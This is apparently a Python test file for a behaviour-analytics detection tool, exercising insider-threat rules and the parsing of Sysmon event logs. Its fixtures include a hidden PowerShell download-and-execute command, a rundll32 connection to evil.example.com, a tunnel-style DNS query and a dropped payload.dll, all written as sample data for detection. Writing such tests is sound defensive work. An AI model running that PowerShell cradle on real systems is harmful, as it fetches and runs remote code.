    assert (ins.usb_devices == 1).all() and ins.new_usb_devices.sum() == 1 and ins.pages_printed.is_monotonic_increasing

    base = {c: 0 for c in list(feats.columns) + ["baseline_restricted"] if c not in ("entity", "date", "department")}
    quiet = dict(base, is_admin=False, department="x")
    df = pd.DataFrame([
        dict(quiet, admin_logons=2, baseline_privileged=0),                      # R24: never had admin rights
        dict(quiet, admin_logons=2, baseline_privileged=90),                     # routine
        dict(quiet, admin_logons=2, baseline_privileged=0, is_admin=True),       # a listed administrator
        dict(quiet, admin_share_access=3, baseline_admin_share=0, new_shares=4),  # R25 + R26
        dict(quiet, pages_printed=180, print_jobs=4, baseline_pages=8),          # R27
        dict(quiet, pages_printed=180, print_jobs=4, baseline_pages=150),        # a heavy printer every day
        dict(quiet, ps_suspicious=1, ps_commands=5)])                            # R28
    _, hits = apply_rules(df, "user")
    assert [[h["rule_id"] for h in x] for x in hits] == [["R24"], [], [], ["R25", "R26"], ["R27"], [], ["R28"]]


def test_sysmon_events_from_event_viewer_csv():
    """Sysmon process starts, network connections, files and DNS queries; same ids in other logs are not Sysmon."""
    from ueba import sources
    from ueba.features import PS_SUSPICIOUS
    sm = "Microsoft-Windows-Sysmon"
    ps = ("Process Create:\nUtcTime: 2026-06-20 10:00:00.000\nImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\"
          "powershell.exe\nCommandLine: powershell -w hidden -c IEX (New-Object Net.WebClient).DownloadString('http://x')"
          "\nUser: CORP\\bob\nParentImage: C:\\Windows\\explorer.exe")
    net = ("Network connection detected:\nImage: C:\\Windows\\System32\\rundll32.exe\nUser: CORP\\bob\nProtocol: tcp\n"
           "SourceIp: 10.0.0.5\nDestinationIp: 45.76.12.27\nDestinationHostname: evil.example.com\nDestinationPort: 443")
    dns = "Dns query:\nQueryName: a1b2c3.tunnel.example.net\nUser: CORP\\bob"
    fil = "File created:\nTargetFilename: C:\\Users\\bob\\AppData\\Local\\Temp\\payload.dll\nUser: CORP\\bob"
    sysacct = "Process Create:\nImage: C:\\Windows\\System32\\svchost.exe\nCommandLine: svchost\nUser: NT AUTHORITY\\SYSTEM"
    rows = [(sm, 1, ps), (sm, 3, net), (sm, 22, dns), (sm, 11, fil), (sm, 1, sysacct),
            ("Microsoft-Windows-Kernel-General", 1, "The system time has changed.")]     # EID 1 that isn't Sysmon
    csv_text = "Keywords,Date and Time,Source,Event ID,Task Category\n" + "".join(
        f'Information,6/20/2026 10:0{i}:00 AM,{src},{eid},None,"{msg}"\n' for i, (src, eid, msg) in enumerate(rows))
    out = dict(sources.read_bytes("Sysmon.csv", csv_text.encode()))
    acc, net_df = out["Sysmon.csv - access"], out["Sysmon.csv - network"]
    assert len(acc) == 2 and set(acc["user"]) == {"bob"}                     # SYSTEM and the kernel event dropped
    cmd = acc[acc["action"] == "powershell"].iloc[0]["resource"]
    assert "DownloadString" in cmd and pd.Series([cmd]).str.contains(PS_SUSPICIOUS, case=False, regex=True)[0]
    assert acc[acc["action"] == "write"].iloc[0]["resource"].endswith("payload.dll")
    assert set(net_df["domain"]) == {"evil.example.com", "a1b2c3.tunnel.example.net"}
    assert net_df.set_index("domain").loc["evil.example.com", "dst_port"] == 443
